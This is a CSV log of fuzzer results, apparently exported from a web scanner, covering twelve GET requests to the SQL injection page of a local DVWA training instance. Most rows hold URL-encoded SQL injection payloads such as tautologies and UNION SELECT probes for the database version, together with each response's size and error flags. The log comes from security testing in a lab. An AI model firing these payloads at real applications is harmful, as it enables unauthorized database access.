col0,col1,col2,col3,col4,col5,col6,col7,col8,col9,col10,col11,col12,col13,col14
0,Original,Sat Aug 29 17:59:41 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit,200,OK,4,480,0,328,4544,Medium,,[]
4,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+union+%28select+NULL%2C+%28select+%40%40version%29%29+--&Submit=Submit,200,OK,11,539,0,338,162,,error,[%27+union+%28select+NULL%2C+%28select+%40%40version%29%29+--]
3,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+union+%28select+%40%40version%29+--&Submit=Submit,200,OK,24,518,0,338,162,,error,[%27+union+%28select+%40%40version%29+--]
2,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+or+1%3D1+--&Submit=Submit,200,OK,24,494,0,338,160,,error,[%27+or+1%3D1+--]
12,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=1+and+user_name%28%29+%3D+%27dbo%27&Submit=Submit,200,OK,25,514,0,337,164,,error,[1+and+user_name%28%29+%3D+%27dbo%27]
7,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+union+%28select+NULL%2C+NULL%2C+NULL%2C+NULL%2C++%28select+%40%40version%29%29+--&Submit=Submit,200,OK,40,564,0,337,162,,error,[%27+union+%28select+NULL%2C+NULL%2C+NULL%2C+NULL%2C++%28select+%40%40version%29%29+--]
14,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a%27+&Submit=Submit,200,OK,23,484,0,338,160,,error,[a%27+]
13,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a&Submit=Submit,200,OK,10,480,0,328,4485,,Reflected,[a]
10,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=1+or+1%3D1&Submit=Submit,200,OK,19,489,0,328,4551,,,[1+or+1%3D1]
1,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=a&Submit=Submit,200,OK,31,480,0,328,4485,,Reflected,[a]
6,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+union+%28select+NULL%2C+NULL%2C+NULL%2C++%28select+%40%40version%29%29+--&Submit=Submit,200,OK,9,556,0,338,162,,error,[%27+union+%28select+NULL%2C+NULL%2C+NULL%2C++%28select+%40%40version%29%29+--]
5,Fuzzed,Sat Aug 29 18:10:07 IST 2020,GET,http://dvwa.local/vulnerabilities/sqli/?id=%27+union+%28select+NULL%2C+NULL%2C+%28select+%40%40version%29%29+--&Submit=Submit,200,OK,32,547,0,337,162,,error,[%27+union+%28select+NULL%2C+NULL%2C+%28select+%40%40version%29%29+--]
